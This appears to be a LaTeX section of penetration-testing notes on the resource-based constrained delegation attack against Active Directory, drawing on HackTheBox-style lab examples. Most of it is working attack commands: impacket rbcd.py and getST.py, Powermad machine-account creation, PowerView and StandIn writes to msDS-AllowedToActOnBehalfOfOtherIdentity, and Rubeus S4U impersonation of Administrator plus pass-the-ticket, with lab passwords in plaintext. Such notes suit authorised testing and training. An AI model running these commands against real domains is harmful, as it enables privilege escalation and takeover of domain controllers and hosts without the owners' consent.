\section{Resource based constrained delegation attack}

\subsection{Introduction}
{\bf Remember: every resource can configure resource-based constrained delegation for itself.}


If an account, having the capability to edit the \verb+msDS-AllowedToActOnBehalfOfOtherIdentity+ attribute of another object ("GenericWrite","GenericAll","WriteProperty","WriteDacl"), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.



The attacker needs to populate the target attribute with the SID of an account that Kerberos can consider as a service. A service ticket will be asked for it. In short, the account must be either:
\begin{itemize}
    \item a user account having a \verb+ServicePrincipalName+ set
    \item an computer account (trailing  \verb+$+ in the \verb+sAMAccountName+)
    \item any other account and conduct SPN-less RBCD witth U2U (user-to-User) authentication
\end{itemize}


the common way is to create a computer account  (if \verb+MachineAccountQuota > 0+)


\subsection{From linux}

\subsubsection{Create a computer or compromise a SPN}

\subsubsection{edit msDS-AllowedToActOnBehalfOfOtherIdentity}

using \verb+impacket+:
\begin{verbatim}
# Read the attribute
rbcd.py -delegate-to 'target$' -dc-ip 'DomainController'\
    -action 'read' 'domain'/'PowerfulUser':'Password'

rbcd.py -delegate-to DC01$ -dc-ip dc01 -action 'read'\
    inlanefreight.local/carole.holmes:Y3t4n0th3rP4ssw0rd


# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-from 'controlledaccount' -delegate-to 'target$' \
    -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'

$ rbcd.py -delegate-to DC01$ -delegate-from HACKTHEBOX$ -dc-ip dc01 \
    -action 'write' inlanefreight.local/carole.holmes:Y3t4n0th3rP4ssw0rd
\end{verbatim}

when conducting attack from a relayed auth, \verb+--delegate-access+ of ntlmrelayx can be used.

\verb+--escalete-user+ can also be used on a controled existing computer

\subsubsection{Obtain a ticket}
\begin{verbatim}
getST.py -spn 'cifs/target' -impersonate Administrator \
    -dc-ip 'DomainController' 'domain/controlledaccountwithSPN:SomePassword'

getST.py -spn cifs/sql01.inlanefreight.local -impersonate Administrator \
    -dc-ip 172.16.117.3 "INLANEFREIGHT"/"plaintext$":"o6@ekK5#rlw2rAe"

\end{verbatim}

\subsubsection{Pass the ticket}


\subsection{On windows}
The attacker uses Rubeus to perform a full S4U attack (S4U2Self and S4U2Proxy) from Service A to Service B for a user with privileged access to Service B
\begin{enumerate}
    \item S4U2Self (from the SPN compromised/created account): Ask for
        a TGS of Administrator to me (Not Forwardable).
    \item S4U2Proxy: Use the not Forwardable TGS of the step before to
        ask for a TGS from Administrator to the victim host.
    \item Even if you are using a not Forwardable TGS, as you are
        exploiting Resource-based constrained delegation, it will
        work.
\end{enumerate}

\subsubsection{Create a computer or compromise a SPN}

powermad
\begin{verbatim}
$password = ConvertTo-SecureString '<password|Jubeaz12345+->' -AsPlainText -Force
New-MachineAccount -MachineAccount "<computer_name>" -Password $($password) \ 
    -Domain <domain_fqdn> -DomainController <dc_ip> -Verbose
\end{verbatim}



\subsubsection{edit msDS-AllowedToActOnBehalfOfOtherIdentity}

with AD powershell module:
\begin{verbatim}
# Assing delegation privileges
Set-ADComputer (Get-Variable -Name "target").Value \
    -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')

Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$ 

# Check that it worked
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount 
\end{verbatim}

with Powersploit:
\begin{verbatim}
# Obtain the SID of the controlled account with SPN (e.g. Computer account)
$ComputerSid = Get-DomainComputer "controlledaccountwithSPN" -Properties objectsid | 
    Select -Expand objectsid

# Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE
$SD = New-Object Security.AccessControl.RawSecurityDescriptor 
    -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# set SD in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the target comptuer account
Get-DomainComputer "target$" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} 
# OR
$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
PS C:\Tools> Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
\end{verbatim}

with \href{https://github.com/FuzzySecurity/StandIn}{StandIn}:
\begin{verbatim}
# Obtain the SID of the controlled account with SPN (e.g. Computer account)
StandIn.exe --object samaccountname=controlledaccountwithSPNName

# Add the object to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer
StandIn.exe --computer "target" --sid "controlledaccountwithSPN's SID"
\end{verbatim}


\subsubsection{ Obtain a ticket}

Rubeus:
\begin{verbatim}
# obtain the hash of the created computer
.\Rubeus.exe hash /password:<password> /user:<account>$ /domain:<domain_fqdn>
Rubeus.exe hash /password:<password>

# Request a TGT for the current user
Rubeus.exe tgtdeleg /nowrap
# OR - Request a TGT for a specific account
Rubeus.exe asktgt /user:"<account>$" /rc4:<nt_hash> /nowrap

# Request the "impersonation" TGS using RC4 Key
.\Rubeus.exe s4u /user:<account>$ /rc4:<nt_hash> /impersonateuser:administrator `
    /msdsspn:cifs/dc01.inlanefreight.local /nowrap
\end{verbatim}

\href{https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)#service-principal-names}{Built-in SPNs Recognized for Computer Accounts}
\subsubsection{Pass the ticket}

\begin{verbatim}
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:doIGJjCCBiKgAwIBBaEDAgEWooIFRTCCBUFhggU9MIIFOaADA...SNIP...
\end{verbatim}

\subsection{links}
\begin{itemize}
    \item 
        \href{https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd}{The Hacker Recipes}
    \item 
        \href{https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html}{Abusing
        Resource-Based Constrained Delegation to Attack Active Directory}
    \item 
        \href{https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/}{Resource-Based
        Constrained Delegation Abuse}
    \item
        \href{https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation}{Resource-based
        Constrained Delegation}
    \item
        \href{https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution}{Kerberos
        Resource-based Constrained Delegation: Computer Object Takeover}
    \item
        \href{https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-genericwrite-write-on-computer}{GenericAll / GenericWrite / Write on Computer}
\end{itemize}


